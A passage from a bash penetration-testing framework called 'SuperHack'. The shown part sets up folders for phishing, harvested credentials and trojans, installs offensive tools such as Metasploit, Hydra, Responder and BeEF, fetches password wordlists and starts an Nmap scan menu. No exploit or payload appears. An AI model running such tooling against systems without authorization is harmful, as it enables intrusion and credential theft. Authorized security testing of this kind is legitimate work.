#!/bin/bash

# SuperHack - Penetration Testing Automation Framework
# For authorized security testing only
# Compatible with Raspberry Pi (ARM architecture)
# Enhanced with Phishing Tools, OSINT, Blue Teaming, and Extended Capabilities

VERSION="3.2"                                         # Current framework version
CONFIG_DIR="/home/evanmarr/.superhack"                # Base configuration directory
LOG_DIR="$CONFIG_DIR/logs"                            # Directory for log files
WORDLISTS_DIR="$CONFIG_DIR/wordlists"                 # Password lists and dictionaries
RESULTS_DIR="$CONFIG_DIR/results"                     # Scan results storage
PHISHING_DIR="$CONFIG_DIR/phishing"                   # Phishing campaign files
CREDS_DIR="$CONFIG_DIR/credentials"                   # Harvested credentials storage
OSINT_DIR="$CONFIG_DIR/osint"                         # OSINT data storage
TROJANS_DIR="$RESULTS_DIR/trojans"                    # Payload/trojan storage

# Colors for output - ANSI escape codes for terminal formatting
RED='\033[0;31m'                                      # Red: errors, warnings, critical alerts
GREEN='\033[0;32m'                                    # Green: success, completion messages
YELLOW='\033[1;33m'                                   # Yellow: caution, in-progress, notices
BLUE='\033[0;34m'                                     # Blue: informational headers
CYAN='\033[0;36m'                                     # Cyan: banners, titles, highlights
MAGENTA='\033[0;35m'                                  # Magenta: special highlights
GREY='\033[0;90m'                                     # Grey: secondary info, disabled items
NC='\033[0m'                                          # No Color: reset to default

# Pulsing color codes for loading bar
PULSE_COLORS=(
    '\033[0;31m'  # Red
    '\033[0;32m'  # Green
    '\033[0;33m'  # Yellow
    '\033[0;34m'  # Blue
    '\033[0;35m'  # Magenta
    '\033[0;36m'  # Cyan
)

# Navigation history for <back> functionality
declare -a INPUT_HISTORY
HISTORY_INDEX=0

# Hacker Quotes Database - Expanded
HACKER_QUOTES=(
    "The only truly secure system is one that is powered off, cast in a block of concrete, and sealed in a lead-lined room with armed guards."
    "Security is a process, not a product."
    "There are only two types of companies: those that have been hacked and those that will be."
    "Given enough eyeballs, all bugs are shallow."
    "The weakest link in the security chain is the human element."
    "Hackers are the immune system of the internet."
    "If you think technology can solve your security problems, then you don't understand the problems and you don't understand the technology."
    "Privacy is not an option, and it shouldn't be the price we accept for just getting on the Internet."
    "The best defense is a good offense."
    "In the world of cyber, the only constant is change."
    "Trust but verify."
    "Paranoia is just an awareness of all the ways things can go wrong."
    "The code is the law."
    "Information wants to be free."
    "We are the music makers, and we are the dreamers of dreams."
    "Any sufficiently advanced technology is indistinguishable from magic."
    "With great power comes great responsibility."
    "The system is only as strong as its weakest password."
    "Enumeration is the key to the kingdom."
    "Persistence is the key to success in penetration testing."
    "We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us."
    "The quieter you become, the more you are able to hear."
    "Hack the planet!"
    "Mess with the best, die like the rest."
    "There is no patch for human stupidity."
    "Social engineering is the art of convincing people to do things they normally wouldn't do."
    "In hacking, the fastest way is not always the most elegant way."
    "To hack is to understand, not to destroy."
    "Every system has a weakness. Find it."
    "The network is the computer."
    "Access is power."
    "Shell is the only truth."
    "Root is the beginning of wisdom."
    "Packet is the only language that matters."
    "Cryptography is the ultimate form of non-violent warfare."
    "Bugs are features waiting to be exploited."
    "Reconnaissance is 90% of the battle."
    "If you can't hack it, you don't own it."
    "The internet interprets censorship as damage and routes around it."
    "Knowledge is power, guard it well."
    "Think outside the box. Then blow up the box."
    "There's no place like 127.0.0.1"
    "RTFM - Read The Friendly Manual."
    "With enough time and resources, anything is possible."
    "Exploitation is just a matter of creativity."
    "Don't fear the root."
    "In the shell we trust."
    "Data wants to be free - help it escape."
    "Security through obscurity is no security at all."
    "Hack for knowledge, not for malice."
)

# =============================================================================
# PACKAGE DEFINITIONS
# =============================================================================

# Core system packages required for penetration testing
CORE_PACKAGES=(
    "nmap" "metasploit-framework" "netcat-traditional" "hydra" "gobuster"
    "dirb" "enum4linux-ng" "john" "hashcat" "sqlmap" "nikto" "masscan"
    "dnsutils" "whois" "curl" "wget" "git" "iw" "tcpdump" "proxychains4"
    "wireless-tools" "aircrack-ng" "python3" "python3-pip" "arp-scan"
    "netdiscover" "macchanger" "crackmapexec" "responder" "bloodhound.py"
    "wireshark" "tshark" "bettercap" "mitmproxy" "httrack" "sendemail"
    "openssl" "sshpass" "tmux" "screen" "vim" "nano" "lolcat" "clamav"
    "clamav-daemon" "rkhunter" "chkrootkit" "haveged" "libreoffice"
    "exiftool" "theharvester" "maltego" "spiderfoot" "recon-ng" "photon"
    "ffuf" "wfuzz" "burpsuite" "zaproxy" "cewl" "medusa" "patator"
    "whatweb" "wpscan" "commix" "beef-xss" "setoolkit" "social-engineer-toolkit"
    " Powershell-empire" " starkiller" "bloodhound" "neo4j" "nuclei"
    "amass" "subfinder" "assetfinder" "httpx-toolkit" "katana"
    "gau" "waybackurls" "unfurl" "anew" "jq" "yq" "gron"
    "docker.io" "docker-compose" "kubectl" "helm"
)

# Python packages for extended functionality - REMOVED social media scraping tools
PYTHON_PACKAGES=(
    "impacket" "requests" "beautifulsoup4" "scapy" "pwntools" "python-nmap"
    "smbprotocol" "ldap3" "pyftpdlib" "pysmb" "paramiko" "cryptography"
    "pyOpenSSL" "flask" "django" "mechanize" "selenium" "pyautogui"
    "shodan" "censys" "requests-html" "holehe"
    "python-whois" "dnspython" "sublist3r" "theHarvester" "wafw00f"
    "xsstrike" "sqlmap" "commix" "tplmap" "git-dumper" "git-hound"
    "waybackpy" "certstream" "subfinder-py" "amass-py" "nuclei-py"
    "asyncio" "aiohttp" "httpx" "websockets" "pysocks" "stem"
    "requests-futures" "cfscrape" "cloudscraper" "fake-useragent"
    "scrapy" "playwright" "selenium-wire" "undetected-chromedriver"
    "pycryptodome" "hashid" "name-that-hash" "johnny" "passlib"
    "bcrypt" "argon2-cffi" "scrypt" "jwt" "pyjwt" "oauthlib"
    "requests-oauthlib"
)

# Arrays to track missing packages during startup checks
MISSING_PACKAGES=()
MISSING_PYTHON=()

# =============================================================================
# INITIALIZATION & VALIDATION
# =============================================================================

# Strict sudo check - exit immediately if not root
# Many penetration testing tools require raw socket access and root privileges
if [[ $EUID -ne 0 ]]; then                            # Check Effective User ID is NOT 0
    echo "Must run with sudo. Quitting!"             # Error message for non-root users
    exit 1                                           # Exit with error code 1
fi

# Global variable to store input
USER_INPUT=""

read_input() {
    local prompt="$1"
    
    # Print prompt to stderr so it displays on terminal but doesn't get captured
    echo -en "${prompt}${NC}" >&2
    read -r raw_input
    
    if [[ "$raw_input" == "<back>" ]]; then
        USER_INPUT="99"
        echo "99"
        return 99
    fi
    
    INPUT_HISTORY[$HISTORY_INDEX]="$raw_input"
    ((HISTORY_INDEX++))
    
    USER_INPUT="$raw_input"
    echo "$USER_INPUT"
    return 0
}

# =============================================================================
# UTILITY FUNCTIONS
# =============================================================================

# Create directory with error checking and fallback to sudo
# Arguments: $1 = directory path to create
create_dir() {
    local dir="$1"                                   # Local variable for directory path
    
    # Check if directory already exists
    if [[ ! -d "$dir" ]]; then
        # Attempt to create directory, suppress errors
        mkdir -p "$dir" 2>/dev/null || {
            # If mkdir fails, try with sudo
            echo -e "${RED}[!] Failed to create directory: $dir${NC}"
            sudo mkdir -p "$dir" 2>/dev/null || {
                # Critical failure - cannot create directory
                echo -e "${RED}[!] Critical: Cannot create directory $dir${NC}"
                return 1                             # Return error code
            }
        }
        chmod 755 "$dir" 2>/dev/null                   # Set permissions (rwxr-xr-x)
        echo -e "${GREEN}[+] Created directory: $dir${NC}"
    fi
    return 0                                         # Success
}

# Initialize all required directories for the framework
init_dirs() {
    echo -e "${BLUE}[*] Initializing directories...${NC}"
    
    # Create base directories with error checking - ALL under /home/evanmarr/.superhack/
    create_dir "$CONFIG_DIR" || exit 1
    create_dir "$LOG_DIR" || exit 1
    create_dir "$WORDLISTS_DIR" || exit 1
    create_dir "$RESULTS_DIR" || exit 1
    create_dir "$RESULTS_DIR/nmap" || exit 1
    create_dir "$RESULTS_DIR/enumeration" || exit 1
    create_dir "$RESULTS_DIR/exploitation" || exit 1
    create_dir "$RESULTS_DIR/wifi" || exit 1
    create_dir "$RESULTS_DIR/bruteforce" || exit 1
    create_dir "$RESULTS_DIR/cracking" || exit 1
    create_dir "$RESULTS_DIR/trojans" || exit 1
    create_dir "$RESULTS_DIR/osint" || exit 1
    create_dir "$RESULTS_DIR/blueteam" || exit 1
    create_dir "$RESULTS_DIR/autopwn" || exit 1
    create_dir "$PHISHING_DIR" || exit 1              # Phishing campaign storage
    create_dir "$PHISHING_DIR/templates" || exit 1    # Phishing page templates
    create_dir "$PHISHING_DIR/captured" || exit 1     # Captured credentials/data
    create_dir "$CREDS_DIR" || exit 1                 # Credential database
    create_dir "$OSINT_DIR" || exit 1                 # OSINT data storage
    create_dir "$TROJANS_DIR" || exit 1               # Trojan/payload storage
    
    # Set ownership to original user (not root) for file access
    chown -R "$SUDO_USER:$SUDO_USER" "$CONFIG_DIR" 2>/dev/null || \
    chown -R "$(whoami):$(whoami)" "$CONFIG_DIR" 2>/dev/null || true
    
    echo -e "${GREEN}[+] Directories initialized${NC}"
}

# Prompt user to save results to file
# Arguments: $1 = data to save, $2 = default filename, $3 = subdirectory
save_results_prompt() {
    local data="$1"                                  # Data content to save
    local default_filename="$2"                      # Suggested filename
    local subdir="$3"                                # Subdirectory under RESULTS_DIR
    
    echo ""
    local save_choice=$(read_input "Save results to file? (y/n): ")
    
    # Process if user wants to save
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        local custom_filename=$(read_input "Enter filename (default: $default_filename): ")
        local filename="${custom_filename:-$default_filename}"  # Use default if empty
        
        # Ensure .txt extension for text files
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        # Write data to file
        if echo "$data" > "$output_path"; then
            echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
        else
            echo -e "${RED}[!] Failed to save results${NC}"
        fi
    fi
}

# Execute command and optionally save output using tee
# Arguments: $1 = command, $2 = default filename, $3 = subdir, $4 = description
save_command_output() {
    local cmd="$1"                                   # Command to execute
    local default_filename="$2"                      # Default output filename
    local subdir="$3"                                # Results subdirectory
    local description="$4"                           # Description for prompt
    
    local save_choice=$(read_input "Save $description to file? (y/n): ")
    
    if [[ "$save_choice" == "y" || "$save_choice" == "Y" ]]; then
        local custom_filename=$(read_input "Enter filename (default: $default_filename): ")
        local filename="${custom_filename:-$default_filename}"
        
        [[ "$filename" != *.txt ]] && filename="${filename}.txt"
        
        local output_path="$RESULTS_DIR/$subdir/$filename"
        
        echo -e "${YELLOW}[*] Running and saving to $output_path...${NC}"
        eval "$cmd" | tee "$output_path"             # Execute and save simultaneously
        echo -e "${GREEN}[+] Results saved to: $output_path${NC}"
    else
        eval "$cmd"                                  # Just execute without saving
    fi
}

# Download file with retry logic for unreliable connections
# Arguments: $1 = URL, $2 = output path, $3 = max retries (optional)
download_file() {
    local url="$1"                                   # Source URL
    local output="$2"                                # Destination path
    local max_retries="${3:-3}"                      # Default 3 retries
    local retry=0
    
    # Create parent directory if needed
    local outdir=$(dirname "$output")
    create_dir "$outdir" || return 1
    
    # Retry loop for resilience
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Downloading (attempt $((retry+1))/$max_retries): $(basename "$output")${NC}"
        
        # wget with timeout and resume capability
        if wget --timeout=30 --tries=2 --continue \
                --progress=bar:force \
                -O "$output.tmp" "$url" 2>&1 | tail -5; then
            
            # Verify download succeeded (file exists and not empty)
            if [[ -f "$output.tmp" && -s "$output.tmp" ]]; then
                mv "$output.tmp" "$output"           # Move from temp to final
                chmod 644 "$output"                  # Set read permissions
                echo -e "${GREEN}[+] Successfully downloaded: $(basename "$output")${NC}"
                return 0                             # Success
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2     # Wait before retry
    done
    
    # All retries failed
    rm -f "$output.tmp"
    echo -e "${RED}[!] Failed to download after $max_retries attempts${NC}"
    return 1                                         # Failure
}

# Clone or update git repository
# Arguments: $1 = repository URL, $2 = destination path
clone_repo() {
    local url="$1"                                   # Git repository URL
    local dest="$2"                                  # Local destination
    
    local destdir=$(dirname "$dest")
    create_dir "$destdir" || return 1
    
    # Update existing repository
    if [[ -d "$dest" ]]; then
        echo -e "${YELLOW}[!] Directory exists, updating: $(basename "$dest")${NC}"
        cd "$dest" && git pull --depth 1 2>/dev/null || {
            echo -e "${YELLOW}[!] Update failed, using existing files${NC}"
            return 0
        }
        echo -e "${GREEN}[+] Updated repository${NC}"
        return 0
    fi
    
    # Clone new repository
    echo -e "${YELLOW}[*] Cloning repository...${NC}"
    if git clone --depth 1 "$url" "$dest" 2>&1 | tail -10; then
        if [[ -d "$dest" ]]; then
            echo -e "${GREEN}[+] Successfully cloned: $(basename "$dest")${NC}"
            return 0
        fi
    fi
    
    echo -e "${RED}[!] Failed to clone repository${NC}"
    return 1
}

# =============================================================================
# DISPLAY FUNCTIONS
# =============================================================================

# Display ASCII art banner with optional lolcat
show_banner() {
    clear
    
    # Check if lolcat is available
    if command -v lolcat &>/dev/null; then
        # Use lolcat for rainbow effect with seed 17 - no ANSI codes when using lolcat
        cat << "EOF" | lolcat --seed 17
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
        echo ""
        # Display random hacker quote
        local random_quote="${HACKER_QUOTES[$RANDOM % ${#HACKER_QUOTES[@]}]}"
        echo "     \"$random_quote\"" | lolcat --seed 17
        echo ""
        echo "                    [ Raspberry Pi Edition v$VERSION ]" | lolcat --seed 17
        echo "                    [ Authorized Use Only ]" | lolcat --seed 17
        echo "                    [ Copywrite 2026 By Evan Marr ]" | lolcat --seed 17
    else
        # Use standard ANSI colors when lolcat not available
        echo -e "${CYAN}"
        cat << "EOF"
    ███████╗██╗   ██╗██████╗ ███████╗██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗
    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝
    ███████╗██║   ██║██████╔╝█████╗  ██████╔╝███████║███████║██║     █████╔╝
    ╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗
    ███████║╚██████╔╝██║     ███████╗██║  ██║██║  ██║██║  ██║╚██████╗██║  ██╗
    ╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
EOF
        echo -e "${NC}"
        # Display random hacker quote
        local random_quote="${HACKER_QUOTES[$RANDOM % ${#HACKER_QUOTES[@]}]}"
        echo -e "${CYAN}     \"$random_quote\"${NC}"
        echo ""
        echo -e "${MAGENTA}                    [ Raspberry Pi Edition v$VERSION ]${NC}"
        echo -e "${RED}                    [ Authorized Use Only ]${NC}"
        echo -e "${BLUE}                    [ Copywrite 2026 By Evan Marr ]${NC}"
    fi
    echo ""
}

# Show menu with main banner and options
# Arguments: $1 = menu title, $2 = menu options (newline separated)
show_menu() {
    local title="$1"
    local options="$2"
    
    show_banner
    echo -e "${CYAN}=== $title ===${NC}"
    echo ""
    echo -e "$options"
    echo ""
}

# =============================================================================
# LOADING BAR & PROGRESS FUNCTIONS - FIXED
# =============================================================================

# Display a loading bar with percentage - FIXED VERSION
show_loading_bar() {
    local current=$1
    local total=$2
    local width=50
    local percentage=$((current * 100 / total))
    local filled=$((width * current / total))
    local empty=$((width - filled))
    
    # Build the bar using printf with literal escape sequences
    printf "\r\033[K"  # Clear line
    
    # Print opening bracket
    printf "\033[0;36m[\033[0m"
    
    # Print filled portion
    for ((i=0; i<filled; i++)); do
        printf "\033[0;32m█\033[0m"
    done
    
    # Print empty portion
    for ((i=0; i<empty; i++)); do
        printf "\033[0;90m░\033[0m"
    done
    
    # Print closing bracket and percentage
    printf "\033[0;36m]\033[0m \033[1;33m%d%%\033[0m (%d/%d)" "$percentage" "$current" "$total"
}

# Show progress with status message - FIXED VERSION
loading_with_status() {
    local current=$1
    local total=$2
    local message="$3"
    
    show_loading_bar "$current" "$total"
    
    # Show status message below bar every 10 items
    if [[ $((current % 10)) -eq 0 ]]; then
        printf "\n\033[0;90m  └─> %s\033[0m" "$message"
        printf "\033[1A\r"  # Move cursor back up
    fi
}

# Show percentage progress for autopwn - FIXED VERSION
show_autopwn_progress() {
    local current_step=$1
    local total_steps=$2
    local step_name="$3"
    
    local percentage=$((current_step * 100 / total_steps))
    local width=40
    local filled=$((width * current_step / total_steps))
    local empty=$((width - filled))
    
    printf "\r\033[K"  # Clear line
    
    # Print label
    printf "\033[1;33m[*]\033[0m %s \033[0;36m[\033[0m" "$step_name"
    
    # Print filled portion
    for ((i=0; i<filled; i++)); do
        printf "\033[0;32m█\033[0m"
    done
    
    # Print empty portion
    for ((i=0; i<empty; i++)); do
        printf "\033[0;90m░\033[0m"
    done
    
    # Print closing bracket and percentage
    printf "\033[0;36m]\033[0m \033[1;33m%d%%\033[0m - %d/%d" "$percentage" "$current_step" "$total_steps"
}

# =============================================================================
# PACKAGE MANAGEMENT
# =============================================================================

# Check if system package is installed
is_installed() {
    dpkg -l "$1" 2>/dev/null | grep -q "^ii  $1 " || command -v "$1" &>/dev/null
}

# Check if Python package is installed
is_python_installed() {
    local pkg="$1"
    local import_name="${pkg//-/_}"
    [[ "$pkg" == "beautifulsoup4" ]] && import_name="bs4"
    [[ "$pkg" == "python-nmap" ]] && import_name="nmap"
    python3 -c "import $import_name" 2>/dev/null
}

# Scan for missing packages and populate arrays with loading bar
check_missing_packages() {
    MISSING_PACKAGES=()
    MISSING_PYTHON=()
    
    local total_packages=$((${#CORE_PACKAGES[@]} + ${#PYTHON_PACKAGES[@]}))
    local current=0
    
    echo -e "${BLUE}[*] Initializing dependency scan...${NC}"
    echo ""
    
    # Check system packages
    for pkg in "${CORE_PACKAGES[@]}"; do
        ((current++))
        loading_with_status "$current" "$total_packages" "Checking $pkg..."
        
        if ! dpkg -l 2>/dev/null | grep -q "^ii  $pkg " && ! command -v "$pkg" &>/dev/null; then
            MISSING_PACKAGES+=("$pkg")
        fi
        
        sleep 0.02  # Small delay for visual effect
    done
    
    # Check Python packages
    for pkg in "${PYTHON_PACKAGES[@]}"; do
        ((current++))
        loading_with_status "$current" "$total_packages" "Checking $pkg..."
        
        if ! is_python_installed "$pkg"; then
            MISSING_PYTHON+=("$pkg")
        fi
        
        sleep 0.02  # Small delay for visual effect
    done
    
    # Final clear and newline
    printf "\n\033[K\n\033[K"
    echo -e "${GREEN}[+] Dependency scan complete!${NC}"
    echo ""
}

# Smart package manager - runs at startup
smart_package_manager() {
    check_missing_packages
    
    local total_missing=${#MISSING_PACKAGES[@]}
    local total_missing_py=${#MISSING_PYTHON[@]}
    local total=$((total_missing + total_missing_py))
    
    # All packages installed
    if [[ $total -eq 0 ]]; then
        echo -e "${GREEN}[+] All dependencies are installed and up to date!${NC}"
        sleep 1
        return 0
    fi
    
    # Display missing packages
    echo -e "${YELLOW}[!] Found $total missing package(s):${NC}"
    echo ""
    
    if [[ $total_missing -gt 0 ]]; then
        echo -e "${CYAN}System packages missing ($total_missing):${NC}"
        printf '  - %s\n' "${MISSING_PACKAGES[@]}"
        echo ""
    fi
    
    if [[ $total_missing_py -gt 0 ]]; then
        echo -e "${CYAN}Python packages missing ($total_missing_py):${NC}"
        printf '  - %s\n' "${MISSING_PYTHON[@]}"
        echo ""
    fi
    
    # User choice for installation
    echo "What would you like to do?"
    echo "1) Install ALL missing packages"
    echo "2) Select which packages to install"
    echo "3) Skip for now (not recommended)"
    echo "0) Back to main menu"
    local choice=$(read_input "Choice: ")
    
    case $choice in
        1) install_all_packages ;;
        2) selective_package_install ;;
        3) 
            echo -e "${YELLOW}[!] Some features may not work without dependencies${NC}"
            sleep 2
            ;;
        0) return ;;
        *) 
            echo -e "${RED}Invalid choice, skipping...${NC}"
            sleep 1
            ;;
    esac
}

# Install package with retry logic
install_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    # Update package lists if not done recently
    if [[ ! -f /var/cache/apt/pkgcache.bin ]] || [[ $(find /var/cache/apt/pkgcache.bin -mmin +60 2>/dev/null) ]]; then
        echo -e "${YELLOW}[*] Updating package lists...${NC}"
        apt-get update -qq || {
            echo -e "${RED}[!] Failed to update package lists${NC}"
            return 1
        }
    fi
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        # Fix for packages that might have different names
        local install_pkg="$pkg"
        [[ "$pkg" == "python3-pip" ]] && apt-get install -y python3-pip python3-setuptools python3-wheel 2>&1 | tail -20 && return 0
        
        if apt-get install -y "$install_pkg" 2>&1 | tail -20; then
            if dpkg -l | grep -q "^ii  $install_pkg " || command -v "$pkg" &>/dev/null; then
                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                return 0
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install Python package with retry
install_python_package() {
    local pkg="$1"
    local max_retries=2
    local retry=0
    
    # Ensure pip is installed first
    if ! command -v pip3 &>/dev/null; then
        apt-get install -y python3-pip 2>/dev/null || apt-get install -y python3 python3-pip 2>/dev/null
    fi
    
    while [[ $retry -lt $max_retries ]]; do
        echo -e "${YELLOW}[*] Installing Python package $pkg (attempt $((retry+1))/$max_retries)...${NC}"
        
        if pip3 install --break-system-packages "$pkg" 2>&1 | tail -20 || pip3 install "$pkg" 2>&1 | tail -20; then
            if is_python_installed "$pkg"; then
                echo -e "${GREEN}[+] $pkg installed successfully${NC}"
                return 0
            fi
        fi
        
        retry=$((retry+1))
        [[ $retry -lt $max_retries ]] && sleep 2
    done
    
    echo -e "${RED}[!] Failed to install $pkg after $max_retries attempts${NC}"
    return 1
}

# Install all missing packages
install_all_packages() {
    echo -e "${BLUE}[*] Installing all missing packages...${NC}"
    
    echo -e "${YELLOW}[*] Updating package lists...${NC}"
    apt-get update -qq || {
        echo -e "${RED}[!] Failed to update package lists${NC}"
        return 1
    }
    
    # Install system packages
    if [[ ${#MISSING_PACKAGES[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PACKAGES[@]} system packages...${NC}"
        for pkg in "${MISSING_PACKAGES[@]}"; do
            install_package "$pkg" || true
        done
    fi
    
    # Install Python packages
    if [[ ${#MISSING_PYTHON[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[*] Installing ${#MISSING_PYTHON[@]} Python packages...${NC}"
        pip3 install --upgrade pip --break-system-packages 2>/dev/null || pip3 install --upgrade pip 2>/dev/null || true
        
        for pkg in "${MISSING_PYTHON[@]}"; do
            install_python_package "$pkg" || true
        done
    fi
    
    download_wordlists
    
    # Initialize Metasploit database
    if command -v msfdb &> /dev/null; then
        echo -e "${BLUE}[*] Initializing Metasploit database...${NC}"
        msfdb init 2>/dev/null || msfdb reinit 2>/dev/null || true
    fi
    
    # Initialize ClamAV database
    if command -v freshclam &> /dev/null; then
        echo -e "${BLUE}[*] Updating ClamAV database...${NC}"
        freshclam 2>/dev/null || true
    fi
    
    echo -e "${GREEN}[+] Package installation complete!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Selective package installation
selective_package_install() {
    local all_packages=("${MISSING_PACKAGES[@]}" "${MISSING_PYTHON[@]}")
    local i=1
    local selections
    
    echo -e "${CYAN}Select packages to install (enter numbers separated by spaces):${NC}"
    echo ""
    
    # Display numbered list
    for pkg in "${MISSING_PACKAGES[@]}"; do
        echo "  $i) [SYSTEM] $pkg"
        ((i++))
    done
    
    for pkg in "${MISSING_PYTHON[@]}"; do
        echo "  $i) [PYTHON] $pkg"
        ((i++))
    done
    
    echo ""
    echo "0) Back to main menu"
    echo ""
    local selections=$(read_input "Enter package numbers (e.g., 1 3 5): ")
    
    [[ "$selections" == "0" ]] && return
    
    apt-get update -qq || true
    
    # Process selections
    for num in $selections; do
        if [[ $num -le ${#MISSING_PACKAGES[@]} ]]; then
            local pkg="${MISSING_PACKAGES[$((num-1))]}"
            install_package "$pkg"
        else
            local py_idx=$((num - ${#MISSING_PACKAGES[@]} - 1))
            [[ $py_idx -ge 0 ]] && local pkg="${MISSING_PYTHON[$py_idx]}" && install_python_package "$pkg"
        fi
    done
    
    local dl_wordlists=$(read_input "Download wordlists too? (y/n): ")
    [[ "$dl_wordlists" == "y" ]] && download_wordlists
    
    echo -e "${GREEN}[+] Selected packages installed!${NC}"
    echo -n "Press Enter to continue..."
    read
}

# Download essential wordlists
download_wordlists() {
    echo -e "${BLUE}[*] Checking wordlists...${NC}"
    
    # Download rockyou.txt password list
    if [[ ! -f "$WORDLISTS_DIR/rockyou.txt" ]]; then
        echo -e "${YELLOW}[!] Downloading rockyou.txt...${NC}"
        
        local urls=(
            "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        )
        
        local downloaded=false
        for url in "${urls[@]}"; do
            if [[ "$url" == *.tar.gz ]]; then
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt.tar.gz"; then
                    echo -e "${YELLOW}[*] Extracting archive...${NC}"
                    tar -xzf "$WORDLISTS_DIR/rockyou.txt.tar.gz" -C "$WORDLISTS_DIR" 2>/dev/null && \
                    rm -f "$WORDLISTS_DIR/rockyou.txt.tar.gz"
                    [[ -f "$WORDLISTS_DIR/rockyou.txt" ]] && downloaded=true
                fi
            else
                if download_file "$url" "$WORDLISTS_DIR/rockyou.txt"; then
                    downloaded=true
                    break
                fi
            fi
        done
        
        # Verify download or create placeholder
        if $downloaded && [[ -f "$WORDLISTS_DIR/rockyou.txt" && -s "$WORDLISTS_DIR/rockyou.txt" ]]; then
            local size=$(du -h "$WORDLISTS_DIR/rockyou.txt" | cut -f1)
            echo -e "${GREEN}[+] rockyou.txt downloaded ($size)${NC}"
        else
            echo -e "${RED}[!] Failed to download rockyou.txt${NC}"
            echo "password" > "$WORDLISTS_DIR/rockyou.txt"
            echo -e "${YELLOW}[!] Created minimal placeholder wordlist${NC}"
        fi
    else
        echo -e "${GREEN}[+] rockyou.txt already exists${NC}"
    fi
    
    # Download SecLists collection
    if [[ ! -d "$WORDLISTS_DIR/seclists" ]]; then
        echo -e "${YELLOW}[!] Downloading SecLists...${NC}"
        if clone_repo "https://github.com/danielmiessler/SecLists.git" "$WORDLISTS_DIR/seclists"; then
            if [[ -d "$WORDLISTS_DIR/seclists/Discovery" ]]; then
                echo -e "${GREEN}[+] SecLists downloaded successfully${NC}"
            else
                echo -e "${RED}[!] SecLists download incomplete${NC}"
            fi
        fi
    else
        echo -e "${GREEN}[+] SecLists already exists${NC}"
    fi
    
    chmod -R 755 "$WORDLISTS_DIR" 2>/dev/null || true
}

# Legacy compatibility wrapper
check_install() {
    local pkg=$1
    local cmd=${2:-$pkg}
    
    if ! command -v "$cmd" &> /dev/null; then
        echo -e "${YELLOW}[!] $pkg not found. Installing...${NC}"
        install_package "$pkg" || {
            echo -e "${RED}[!] Failed to install $pkg${NC}"
            return 1
        }
    fi
}

# =============================================================================
# NETWORK SCANNING MODULES
# =============================================================================

# Advanced customizable Nmap scanner with multiple options
advanced_nmap_scan() {
    check_install nmap
    
    while true; do
        show_menu "Advanced Nmap Scanner" "1) SYN Scan (-sS) - Stealth, requires root
2) Connect Scan (-sT) - TCP connect
3) UDP Scan (-sU) - UDP ports
4) ACK Scan (-sA) - Firewall rule mapping
5) Window Scan (-sW) - Similar to ACK
6) FIN/NULL/Xmas Scan (-sF/sN/sX) - Stealthy
7) Comprehensive (Multiple types)
0) Back to main menu"
        
        local scan_type=$(read_input "Select scan type: ")
        
        [[ "$scan_type" == "0" ]] && return
        [[ "$scan_type" == "99" ]] && continue
        
        local target=$(read_input "Enter target(s) (IP, hostname, range, or file with -iL): ")
        [[ -z "$target" ]] && continue
        [[ "$target" == "99" ]] && continue
        
        break
    done
    
    while true; do
        show_menu "Port Selection" "1) Top 100 common ports (--top-ports 100)
2) Top 1000 common ports (--top-ports 1000)
3) All 65535 ports (-p-)
4) Specific ports (e.g., 80,443,8080)
5) Default Nmap ports
0) Back to main menu"
        
        local port_option=$(read_input "Select port option: ")
        [[ "$port_option" == "0" ]] && return
        [[ "$port_option" == "99" ]] && continue
        
        # Configure port scanning options
        case $port_option in
            1) port_flag="--top-ports 100" ;;
            2) port_flag="--top-ports 1000" ;;
            3) port_flag="-p-" ;;
            4) 
                local custom_ports=$(read_input "Enter ports (comma-separated or range like 1-1000): ")
                [[ "$custom_ports" == "99" ]] && continue
                port_flag="-p $custom_ports"
                ;;
            5) port_flag="" ;;
        esac
        break
    done
    
    # Additional options
    show_menu "Additional Options" "Configure scan options..."
    
    local sv_detect=$(read_input "Enable service/version detection (-sV)? (y/n): ")
    [[ "$sv_detect" == "y" ]] && sv_flag="-sV" || sv_flag=""
    
    local os_detect=$(read_input "Enable OS detection (-O)? (y/n): ")
